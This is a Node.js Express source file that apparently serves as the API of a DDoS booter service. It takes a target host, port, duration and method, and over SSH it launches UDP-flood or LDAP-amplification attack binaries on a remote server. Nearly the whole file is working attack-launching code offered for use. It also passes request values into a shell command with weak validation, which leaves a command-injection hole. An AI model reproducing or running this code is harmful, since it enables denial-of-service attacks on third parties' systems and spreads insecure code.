const { exec } = require('child_process');
const ssh2 = require('ssh2');

const server = 'your_ssh_server';
const username = 'your_ssh_username';
const password = 'your_ssh_password';

const express = require('express');
const app = express();
const port = 3000;

app.get('/', (req, res) => {
    const apiKey = req.query.apiKey;

    // HANDLE API KEY //
    if (apiKey !== 'your_api_key') {
        return res.status(401).send('ERR: INVALID KEY');
    }

    const host = req.query.host;
    const port = parseInt(req.query.port) > 0 && parseInt(req.query.port) < 65536 ? parseInt(req.query.port) : 80;
    const ip = /^[a-zA-Z0-9\.-_]+$/.test(host) ? host : res.status(400).send('Invalid host');
    const time = parseInt(req.query.time) > 0 && parseInt(req.query.time) < 60 * 60 ? parseInt(req.query.time) : 30;
    const domain = req.query.host;

    if (!/^(https?|ftp):\/\//.test(domain) && !/^(?:(?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)$/.test(domain)) {
        return res.status(400).send('Invalid Domain');
    }

    const smIP = ip.replace(/\./g, '');
    const smDomain = domain.replace(/\./g, '').replace('http://', '');

    let command;

    switch (req.query.method) {
        case 'UDP':
            command = `screen -dmS ${smIP} ./udp ${ip} ${port} 1 500 3 ${time}`;
            break;
        case 'LDAP':
            command = `screen -dmS ${smIP} ./ldap ${ip} ${port} ldapx.txt 15 -1 ${time}`;
            break;
        // Add other cases for each method...

        default:
            return res.status(400).send('Invalid method');
    }

    // SERVER CONNECTION HANDLING //

    const conn = new ssh2.Client();
    
    conn.on('ready', () => {
        console.log('Connection successful');

        // EXECUTE COMMAND //
        conn.exec(command, (err, stream) => {
            if (err) throw err;

            stream.on('close', (code, signal) => {
                console.log(`Stream closed with code ${code} and signal ${signal}`);
                conn.end();
            }).on('data', (data) => {
                console.log(`STDOUT: ${data}`);
            }).stderr.on('data', (data) => {
                console.log(`STDERR: ${data}`);
            });
        });
    }).on('error', (err) => {
        console.error(`Connection error: ${err}`);
    }).connect({
        host: server,
        port: 22,
        username: username,
        password: password
    });

    res.send('Command executed');
});

app.listen(port, () => {
    console.log(`Server listening at http://localhost:${port}`);
});
